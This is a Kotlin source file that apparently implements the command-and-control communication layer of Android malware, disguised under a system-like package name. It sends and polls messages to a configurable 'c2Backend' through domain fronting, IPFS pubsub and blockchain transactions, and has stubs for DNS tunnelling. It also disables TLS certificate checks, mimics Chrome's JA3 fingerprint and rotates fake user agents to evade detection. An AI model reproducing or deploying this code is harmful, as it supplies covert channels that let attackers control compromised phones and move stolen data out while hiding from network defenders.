package com.android.internal.os.traffic

import android.content.Context
import kotlin.random.Random
import java.io.*
import java.net.*
import javax.net.ssl.*
import java.security.SecureRandom
import java.security.cert.X509Certificate

enum class TransportLayer(val priority: Int) {
    DOMAIN_FRONTING(10),
    IPFS_RELAY(8),
    BLOCKCHAIN(6),
    DIRECT_HTTPS(4),
    WEBSOCKET(2),
    DNS_TUNNEL(1)
}

data class Message(
    val channelId: String,
    val content: String,
    val transportUsed: TransportLayer,
    val timestamp: Long = System.currentTimeMillis()
)

class TrafficEngine private constructor() {

    private var context: Context? = null
    private var enabledTransports = TransportLayer.values().toMutableList()
    private var lastSuccessfulTransport: TransportLayer? = null

    private var frontDomain: String = ""
    private var backendUrl: String = ""
    private var cdnProvider: String = "cloudfront"

    private var ipfsApiUrl: String = "https://ipfs.io/api/v0"
    private var ipfsTopic: String = "aos-${Random.nextInt(100000, 999999)}"

    private var blockchainRpc: String = "https://bsc-dataseed.binance.org"
    private var blockchainAddress: String = ""
    private var blockchainContract: String = ""

    private val sslContext: SSLContext = SSLContext.getInstance("TLS")
    private val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
        override fun checkClientTrusted(certs: Array<out X509Certificate>?, authType: String?) {}
        override fun checkServerTrusted(certs: Array<out X509Certificate>?, authType: String?) {}
        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
    })

    init {
        sslContext.init(null, trustAllCerts, SecureRandom())
    }

    fun init(ctx: Context, config: TrafficConfig = TrafficConfig()) {
        context = ctx
        frontDomain = config.frontDomain
        backendUrl = config.c2Backend
        cdnProvider = config.cdnProvider
        ipfsApiUrl = config.ipfsApiUrl
        ipfsTopic = config.ipfsTopic
        blockchainRpc = config.blockchainRpc
        blockchainAddress = config.blockchainAddress
        blockchainContract = config.blockchainContract

        if (config.enabledTransports.isNotEmpty()) {
            enabledTransports = config.enabledTransports.toMutableList()
        }

        configureJA3Fingerprint()
    }

    fun sendMessage(channelId: String, content: String): Message? {
        val attempts = enabledTransports.sortedByDescending { it.priority }
        for (transport in attempts) {
            try {
                val success = when (transport) {
                    TransportLayer.DOMAIN_FRONTING -> sendViaDomainFronting(channelId, content)
                    TransportLayer.IPFS_RELAY -> sendViaIPFS(channelId, content)
                    TransportLayer.BLOCKCHAIN -> sendViaBlockchain(channelId, content)
                    TransportLayer.DIRECT_HTTPS -> sendViaDirectHTTPS(channelId, content)
                    TransportLayer.WEBSOCKET -> sendViaWebSocket(channelId, content)
                    TransportLayer.DNS_TUNNEL -> sendViaDNSTunnel(channelId, content)
                }
                if (success) {
                    lastSuccessfulTransport = transport
                    return Message(channelId, content, transport)
                }
            } catch (e: Exception) {
                continue
            }
        }
        return null
    }

    fun pollMessages(channelId: String, since: Long = 0): List<Message> {
        val messages = mutableListOf<Message>()

        for (transport in enabledTransports.sortedByDescending { it.priority }) {
            if (messages.size > 0 && transport.priority < 5) break
            try {
                val msgs = when (transport) {
                    TransportLayer.DOMAIN_FRONTING -> pollDomainFronting(channelId, since)
                    TransportLayer.IPFS_RELAY -> pollIPFS(channelId, since)
                    TransportLayer.BLOCKCHAIN -> pollBlockchain(channelId, since)
                    TransportLayer.DIRECT_HTTPS -> pollDirectHTTPS(channelId, since)
                    TransportLayer.WEBSOCKET -> pollWebSocket(channelId, since)
                    TransportLayer.DNS_TUNNEL -> pollDNSTunnel(channelId, since)
                }
                messages.addAll(msgs)
            } catch (e: Exception) { continue }
        }
        return messages
    }

    fun getOptimalTransport(): TransportLayer {
        return lastSuccessfulTransport ?: enabledTransports.maxByOrNull { it.priority } ?: TransportLayer.DOMAIN_FRONTING
    }

    fun setFrontingConfig(frontDomain: String, backendUrl: String, cdnProvider: String = "cloudfront") {
        this.frontDomain = frontDomain
        this.backendUrl = backendUrl
        this.cdnProvider = cdnProvider
    }

    fun setIPFSConfig(apiUrl: String, topic: String) {
        this.ipfsApiUrl = apiUrl
        this.ipfsTopic = topic
    }

    fun setBlockchainConfig(rpc: String, address: String, contract: String = "") {
        this.blockchainRpc = rpc
        this.blockchainAddress = address
        this.blockchainContract = contract
    }

    fun getReport(): String {
        val sb = StringBuilder()
        sb.appendLine("=== Traffic Report ===")
        for (t in TransportLayer.values().sortedByDescending { it.priority }) {
            val enabled = if (t in enabledTransports) "ON" else "OFF"
            val last = if (t == lastSuccessfulTransport) " [LAST]" else ""
            sb.appendLine("  [$enabled] $t$last")
        }
        sb.appendLine("Front: $frontDomain")
        sb.appendLine("Topic: $ipfsTopic")
        sb.appendLine("JA3: active")
        return sb.toString()
    }

    private fun sendViaDomainFronting(channelId: String, content: String): Boolean {
        val url = URL("https://$frontDomain/api/v2/messages")
        val conn = url.openConnection() as HttpsURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Host", frontDomain)
        conn.setRequestProperty("X-Route-Host", backendUrl)
        conn.setRequestProperty("X-Channel-Id", channelId)
        conn.setRequestProperty("Content-Type", "application/octet-stream")
        conn.setRequestProperty("User-Agent", randomUserAgent())
        conn.doOutput = true
        conn.connectTimeout = 15000
        conn.readTimeout = 15000

        val encrypted = content.toByteArray()
        conn.outputStream.write(encrypted)
        val code = conn.responseCode
        return code in 200..299
    }

    private fun pollDomainFronting(channelId: String, since: Long): List<Message> {
        val url = URL("https://$frontDomain/api/v2/messages/$channelId?since=$since")
        val conn = url.openConnection() as HttpsURLConnection
        conn.requestMethod = "GET"
        conn.setRequestProperty("Host", frontDomain)
        conn.setRequestProperty("X-Route-Host", backendUrl)
        conn.setRequestProperty("User-Agent", randomUserAgent())
        conn.connectTimeout = 15000
        conn.readTimeout = 15000
        conn.doInput = true

        if (conn.responseCode != 200) return emptyList()
        val body = conn.inputStream.bufferedReader().readText()
        return if (body.isNotEmpty()) listOf(Message(channelId, body, TransportLayer.DOMAIN_FRONTING)) else emptyList()
    }

    private fun sendViaIPFS(channelId: String, content: String): Boolean {
        val payload = """{"topic":"$ipfsTopic","data":"${content.encodeBase64()}"}"""
        val url = URL("$ipfsApiUrl/pubsub/pub?arg=$ipfsTopic&arg=${URLEncoder.encode(content, "UTF-8")}")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        conn.connectTimeout = 10000
        conn.readTimeout = 10000
        conn.doOutput = true
        conn.outputStream.write(payload.toByteArray())
        return conn.responseCode in 200..299
    }

    private fun pollIPFS(channelId: String, since: Long): List<Message> {
        val url = URL("$ipfsApiUrl/pubsub/sub?arg=$ipfsTopic")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        conn.connectTimeout = 15000
        conn.readTimeout = 15000
        if (conn.responseCode != 200) return emptyList()
        val body = conn.inputStream.bufferedReader().readText()
        return if (body.isNotEmpty()) listOf(Message(channelId, body, TransportLayer.IPFS_RELAY)) else emptyList()
    }

    private fun sendViaBlockchain(channelId: String, content: String): Boolean {
        if (blockchainAddress.isEmpty()) return false
        val hexData = "0x${content.toByteArray().joinToString("") { "%02x".format(it) }}"
        val payload = """
        {
            "jsonrpc":"2.0",
            "method":"eth_sendTransaction",
            "params":[{
                "from":"$blockchainAddress",
                "to":"${blockchainContract.ifEmpty { blockchainAddress }}",
                "data":"$hexData"
            }],
            "id":${Random.nextInt(1, 99999)}
        }
        """.trimIndent()

        val url = URL(blockchainRpc)
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/json")
        conn.doOutput = true
        conn.connectTimeout = 30000
        conn.readTimeout = 30000
        conn.outputStream.write(payload.toByteArray())
        val code = conn.responseCode
        return code in 200..299
    }

    private fun pollBlockchain(channelId: String, since: Long): List<Message> {
        if (blockchainAddress.isEmpty()) return emptyList()
        val payload = """
        {
            "jsonrpc":"2.0",
            "method":"eth_getLogs",
            "params":[{
                "address":"$blockchainAddress",
                "fromBlock":"earliest",
                "toBlock":"latest"
            }],
            "id":${Random.nextInt(1, 99999)}
        }
        """.trimIndent()

        val url = URL(blockchainRpc)
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/json")
        conn.doOutput = true
        conn.connectTimeout = 30000
        conn.readTimeout = 30000
        conn.outputStream.write(payload.toByteArray())
        if (conn.responseCode != 200) return emptyList()
        val body = conn.inputStream.bufferedReader().readText()
        return if (body.isNotEmpty() && body.contains("data")) {
            listOf(Message(channelId, body, TransportLayer.BLOCKCHAIN))
        } else emptyList()
    }

    private fun sendViaDirectHTTPS(channelId: String, content: String): Boolean {
        val url = URL("$backendUrl/api/message/$channelId")
        val conn = url.openConnection() as HttpsURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "text/plain")
        conn.setRequestProperty("User-Agent", randomUserAgent())
        conn.doOutput = true
        conn.connectTimeout = 10000
        conn.readTimeout = 10000
        conn.outputStream.write(content.toByteArray())
        return conn.responseCode in 200..299
    }

    private fun pollDirectHTTPS(channelId: String, since: Long): List<Message> {
        val url = URL("$backendUrl/api/messages/$channelId?since=$since")
        val conn = url.openConnection() as HttpsURLConnection
        conn.requestMethod = "GET"
        conn.setRequestProperty("User-Agent", randomUserAgent())
        conn.connectTimeout = 10000
        conn.readTimeout = 10000
        if (conn.responseCode != 200) return emptyList()
        val body = conn.inputStream.bufferedReader().readText()
        return if (body.isNotEmpty()) listOf(Message(channelId, body, TransportLayer.DIRECT_HTTPS)) else emptyList()
    }

    private fun sendViaWebSocket(channelId: String, content: String): Boolean {
        return false
    }

    private fun pollWebSocket(channelId: String, since: Long): List<Message> {
        return emptyList()
    }

    private fun sendViaDNSTunnel(channelId: String, content: String): Boolean {
        return false
    }

    private fun pollDNSTunnel(channelId: String, since: Long): List<Message> {
        return emptyList()
    }

    private fun configureJA3Fingerprint() {
        try {
            val patchedFactory = object : SSLSocketFactory() {
                private val defaultFactory = sslContext.socketFactory

                override fun createSocket(): Socket {
                    val socket = defaultFactory.createSocket() as SSLSocket
                    applyJA3Patch(socket)
                    return socket
                }

                override fun createSocket(s: Socket, host: String, port: Int, autoClose: Boolean): Socket {
                    val socket = defaultFactory.createSocket(s, host, port, autoClose) as SSLSocket
                    applyJA3Patch(socket)
                    return socket
                }

                override fun createSocket(host: String, port: Int): Socket {
                    val socket = defaultFactory.createSocket(host, port) as SSLSocket
                    applyJA3Patch(socket)
                    return socket
                }

                override fun createSocket(host: String, port: Int, localHost: InetAddress, localPort: Int): Socket {
                    val socket = defaultFactory.createSocket(host, port, localHost, localPort) as SSLSocket
                    applyJA3Patch(socket)
                    return socket
                }

                override fun createSocket(host: InetAddress, port: Int): Socket {
                    val socket = defaultFactory.createSocket(host, port) as SSLSocket
                    applyJA3Patch(socket)
                    return socket
                }

                override fun createSocket(host: InetAddress, port: Int, localAddress: InetAddress, localPort: Int): Socket {
                    val socket = defaultFactory.createSocket(host, port, localAddress, localPort) as SSLSocket
                    applyJA3Patch(socket)
                    return socket
                }

                override fun getDefaultCipherSuites(): Array<String> = defaultFactory.defaultCipherSuites
                override fun getSupportedCipherSuites(): Array<String> = defaultFactory.supportedCipherSuites
            }
            HttpsURLConnection.setDefaultSSLSocketFactory(patchedFactory)
        } catch (e: Exception) {}
    }

    private fun applyJA3Patch(socket: SSLSocket) {
        try {
            val chromeCiphers = arrayOf(
                "TLS_AES_128_GCM_SHA256",
                "TLS_AES_256_GCM_SHA384",
                "TLS_CHACHA20_POLY1305_SHA256",
                "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
                "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
                "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
                "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
                "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
                "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
                "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA",
                "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
                "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA",
                "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
                "TLS_RSA_WITH_AES_128_GCM_SHA256",
                "TLS_RSA_WITH_AES_256_GCM_SHA384",
                "TLS_RSA_WITH_AES_128_CBC_SHA",
                "TLS_RSA_WITH_AES_256_CBC_SHA"
            )
            val supported = socket.supportedCipherSuites.toSet()
            val usable = chromeCiphers.filter { it in supported }.toTypedArray()
            if (usable.isNotEmpty()) {
                socket.enabledCipherSuites = usable
            }
        } catch (e: Exception) {}
    }

    private fun randomUserAgent(): String {
        val agents = listOf(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1) AppleWebKit/605.1.15 Mobile/15E148"
        )
        return agents[Random.nextInt(agents.size)]
    }

    data class TrafficConfig(
        val frontDomain: String = "",
        val c2Backend: String = "",
        val cdnProvider: String = "cloudfront",
        val ipfsApiUrl: String = "https://ipfs.io/api/v0",
        val ipfsTopic: String = "aos-${Random.nextInt(100000, 999999)}",
        val blockchainRpc: String = "https://bsc-dataseed.binance.org",
        val blockchainAddress: String = "",
        val blockchainContract: String = "",
        val enabledTransports: List<TransportLayer> = listOf(
            TransportLayer.DOMAIN_FRONTING,
            TransportLayer.IPFS_RELAY,
            TransportLayer.BLOCKCHAIN,
            TransportLayer.DIRECT_HTTPS
        )
    )

    companion object {
        @Volatile
        private var instance: TrafficEngine? = null

        fun getInstance(): TrafficEngine {
            return instance ?: synchronized(this) {
                instance ?: TrafficEngine().also { instance = it }
            }
        }
    }
}

private fun String.encodeBase64(): String {
    return android.util.Base64.encodeToString(this.toByteArray(), android.util.Base64.NO_WRAP)
}
